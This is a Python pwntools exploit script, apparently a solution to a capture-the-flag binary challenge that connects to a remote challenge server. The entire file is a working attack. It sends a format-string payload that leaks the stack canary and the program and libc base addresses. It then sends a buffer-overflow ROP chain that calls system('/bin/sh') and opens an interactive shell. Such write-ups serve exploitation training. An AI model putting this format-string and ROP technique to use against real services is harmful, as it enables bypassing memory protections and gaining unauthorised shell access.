#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./what_does_the_f_say_patched")
libc = ELF("libc.so.6", checksec = False)

context.binary = exe
srocks = 69.69


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.49.166", 30059)

    return r


def buy_kryptonite_vodka(format_str: bytes) -> bytes:
    global srocks

    r.sendlineafter(b"food", b"1")
    r.sendlineafter(b"rocks)", b"2")
    r.sendlineafter(b"Kryptonite?", format_str)
    srocks -= 6.90

    return r.recvlines(2)[1]


def spawn_shell(canary: int):
    rop = ROP(libc)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret     = rop.find_gadget(["ret"])[0]
    payload = flat(
                    b"A" * 24,                      # Padding
                    p64(canary),                    # Canary
                    b"A" * 8,                       # Fake RBP
                    p64(pop_rdi),                   # Gadget to pop into RDI the address of "/bin/sh"
                    p64(next(libc.search(b"/bin/sh\x00"))),
                    p64(ret),                       # Fake return address
                    p64(libc.symbols["system"])     # le GOAT
                  )
    
    r.sendlineafter(b"buy it?", payload)
    r.interactive("$ ")


def main():
    r = conn()

    leaks = re.match(rb"(.+)-(.+)-(.+)", buy_kryptonite_vodka(b"%13$lx-%19$lx-%25$lx"))

    canary = int(leaks.group(1), 16)
    exe.address = int(leaks.group(2), 16) - (exe.symbols["main"] + 55)
    libc.address = int(leaks.group(3), 16) - (libc.symbols["__libc_start_main"] + 231)

    log.info(f"Canary : 0x{canary:x}")
    log.info(f"Program base address : 0x{exe.address:x}")
    log.info(f"LIBC base address : 0x{libc.address:x}")

    while srocks > 20.0:
        buy_kryptonite_vodka(b"A")

    buy_kryptonite_vodka(b"A")

    # NOTE: Sometimes it crashes but it's like 1 over 5 runs in average
    spawn_shell(canary)


if __name__ == "__main__":
    main()
